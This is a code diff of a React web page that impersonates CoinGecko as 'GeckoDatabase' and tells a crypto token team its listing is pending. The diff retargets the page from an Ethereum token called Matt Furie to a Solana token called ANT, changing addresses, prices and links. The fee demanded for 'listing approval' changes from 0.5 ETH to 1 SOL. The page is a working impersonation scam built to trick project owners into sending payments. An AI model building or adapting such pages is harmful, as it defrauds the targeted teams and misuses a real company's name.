@@ -60,7 +60,7 @@ const submit = ()=>{
      <nav className=' text-gray-300'>
   
   <div className=' p-3 pt-4 flex app items-center justify-between'>
-  <img src="https://media.discordapp.net/attachments/974953912689893387/1262622392350408756/Asset_7.png?ex=6697443c&is=6695f2bc&hm=90ca42ddb45ba995b6966411a5531214d1d5afb55aacc50d3baa927c2d88c9e2&=&format=webp&quality=lossless&width=2160&height=484" alt="" className='md:w-[15%] w-[50%]'/>
+  <img src="/img/Asset 7.png" alt="" className='md:w-[15%] w-[50%]'/>
   
 
   <div className='md:flex hidden justify-between w-[20%] mr-10'>
@@ -82,8 +82,8 @@ const submit = ()=>{
   Verify your project Details directly form the CoinGecko Database
 </p>
 <div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
-<img className='md:w-[2%] w-[7%] rounded-full' src="https://dd.dexscreener.com/ds-data/tokens/ethereum/0x652c0e3d583a43c6230eb2a8e9c9634e0ded7765.png?key=8c671e" alt="" />
-<p>Matt Furie</p>
+<img className='md:w-[2%] w-[7%] rounded-full' src="https://dd.dexscreener.com/ds-data/tokens/solana/GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump.png?key=04e836" alt="" />
+<p>ANT</p>
 </div>
 
 <div className='p-2 app bg-[#000000] mt-2 md:mt-5'>
@@ -97,20 +97,20 @@ Database_file
 </p>
 <p className='mt-3 text-[#FD5370]'>project_data:[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1007240077",</span></p>
-  <p>"type": <span className='text-[#CFADE8]'>"token",</span></p>
+  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1007240079",</span></p>
+  <p>"type": <span className='text-[#CFADE8]'>"memecoin",</span></p>
   <p className='mt-1 text-[#FD5370]'>"attributes": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"name": <span className='text-[#CFADE8]'>"Matt Furie",</span></p>
-    <p>"symbol": <span className='text-[#CFADE8]'>"FURIE",</span></p>
-    <p>"chain": <span className='text-[#CFADE8]'>"eth",</span></p>
-    <p>"contract_address": <span className='text-[#CFADE8]'>"0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765",</span></p>
-    <p>"decimals": <span className='text-[#CFADE8]'>"18",</span></p>
+    <p>"name": <span className='text-[#CFADE8]'>"Ant",</span></p>
+    <p>"symbol": <span className='text-[#CFADE8]'>"ANT",</span></p>
+    <p>"chain": <span className='text-[#CFADE8]'>"solana",</span></p>
+    <p>"contract_address": <span className='text-[#CFADE8]'>"GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump",</span></p>
+    <p>"decimals": <span className='text-[#CFADE8]'>"6",</span></p>
     <p>"image_url": <span className='text-[#CFADE8]'>"",</span></p>
-    <p>"total_supply": <span className='text-[#CFADE8]'>"100,000,000",</span></p>
-    <p>"liquidity": <span className='text-[#CFADE8]'>"62,000",</span></p>
-    <p>"market_cap": <span className='text-[#CFADE8]'>"236,000",</span></p>
-    <p>"price_usd": <span className='text-[#CFADE8]'>"0.002494",</span></p>
+    <p>"total_supply": <span className='text-[#CFADE8]'>"999,732,887.83",</span></p>
+    <p>"liquidity": <span className='text-[#CFADE8]'>"28,000",</span></p>
+    <p>"market_cap": <span className='text-[#CFADE8]'>"69,366.76",</span></p>
+    <p>"price_usd": <span className='text-[#CFADE8]'>"0.0000693853",</span></p>
     </div>
     ],</span></p>
 
@@ -121,20 +121,20 @@ Database_file
 <div className=' p-2 md:pt-2 pt-0 overflow-scroll app bg-[#000000] md:mt-2 lll'>
 <p className='text-[#FD5370]'>"description": <span className='text-[#CFADE8]'>[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"en": <span className='text-[#CFADE8]'>"Furie, the amazing creator of Pepe, Andy, Brett and the rest of the Boys' Club! His creations have become crypto mega stars, and now, it's time for the father of them all to take the spotlight! This is Matt Furie, the Coin!",</span></p>
+  <p>"en": <span className='text-[#CFADE8]'>"We are an NFT and Token project on SOL. We are known as the people’s project and are Education centred. A project based on Ants, working together and for each other via support, learning and guidance.",</span></p>
   <p>"de": <span className='text-[#CFADE8]'>"",</span></p>
   </div>
  ],</span>
   <p className='mt-1 text-[#FD5370]'>"links": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"website": <span className='text-[#CFADE8]'>"https://mattfurie0x65.com/",</span></p>
-    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://mattfurie0x65.com/whitepaper",</span></p>
-    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://etherscan.io/token/0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765",</span></p>
-    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/Matt_0x65FurieCTO",</span></p>
-    <p>"twitter_url": <span className='text-[#CFADE8]'>"https://x.com/MattFurie0x65",</span></p>
-    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://app.uniswap.org/swap?outputCurrency=0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765&chain=ethereum",</span></p>
+    <p>"website": <span className='text-[#CFADE8]'>"https://antsnest.io/",</span></p>
+    <p>"whitepaper": <span className='text-[#CFADE8]'>"",</span></p>
+    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://solscan.io/token/GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump",</span></p>
+    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/TheAntsPortal",</span></p>
+    <p>"twitter_url": <span className='text-[#CFADE8]'>"https://x.com/theantznest?s=21",</span></p>
+    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://raydium.io/swap/?inputMint=GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump&outputMint=sol",</span></p>
    
-    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/bsc/pools/0xfb2a1323445cd8a3e871f76147ca9828cb372cab",</span></p>
+    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/solana/pools/BsmVzrHB9UnFDJ5RZVufnqAGF58bKFx3wrossur4w1Pb",</span></p>
     <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"listing_approval",</span></p>
     </div>
       ],</span></p> ].</p>
@@ -142,7 +142,7 @@ Database_file
   
 
   <div className='flex justify-center'>
-<img className='w-[60%]' src="https://media.discordapp.net/attachments/974953912689893387/1262650021573169222/Asset_4.png?ex=66975df8&is=66960c78&hm=47ec82374bf6ea15cab6d12abcd596110c40cd76a6473e12d9dd7f9a0237a278&=&format=webp&quality=lossless&width=2160&height=484" alt="" />
+<img className='w-[60%]' src="/img/Asset 4.png" alt="" />
 </div>
 </div>
 </div>
@@ -151,11 +151,11 @@ Database_file
 <p>
 Please ensure that all details are accurately implemented to avoid additional charges for token updates by <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a>. Once verified, approve the publishing. It takes approximately 1-3 hours for the listing to be fully published on our official <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a> platform.
 </p>
-<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing Approval fee cost 0.5 Eth, Endavour to send payment tx for fast verification and approval., After approval project will be listed in 10-20 minutes.</p>
+<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing Approval fee cost 1 Sol, Endavour to send payment tx for fast verification and approval., After approval project will be listed in 10-20 minutes.</p>
 </div>
 
 <div className='mt-3 app flex justify-between'>
-<button className='px-4 py-2 bg-[#66BB6A]' onClick={handleOpen}>Approve Listing</button>
+<button className='px-4 py-2 bg-[#66BB6A]' onClick={submit}>Approve Listing</button>
 <button className='px-4 py-2 bg-[#FD5370] flex gap-2 items-center' onClick={submit}><IoConstructSharp className='text-black text-lg'/>Edit details </button>
 </div>
 
@@ -166,7 +166,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
   <footer className='app text-gray-400'>
     <div className='md:flex p-5  '>
 <section className='md:w-[60%] app '>
-<img src="https://media.discordapp.net/attachments/974953912689893387/1262622392350408756/Asset_7.png?ex=6697443c&is=6695f2bc&hm=90ca42ddb45ba995b6966411a5531214d1d5afb55aacc50d3baa927c2d88c9e2&=&format=webp&quality=lossless&width=2160&height=484" alt="" className='md:w-[30%] w-[70%]'/>
+<img src="/img/Asset 7.png" alt="" className='md:w-[30%] w-[70%]'/>
 <p className='mt-5 text-xs'>GeckoDatabase is the most fastest and comprehensive real-time DEX tracker, 
   built by the team behind CoinGecko. Helping crypto projects with fast track listings, tokens updates for any project and more on decentralized exchanges across all blockchains.</p>
 </section>
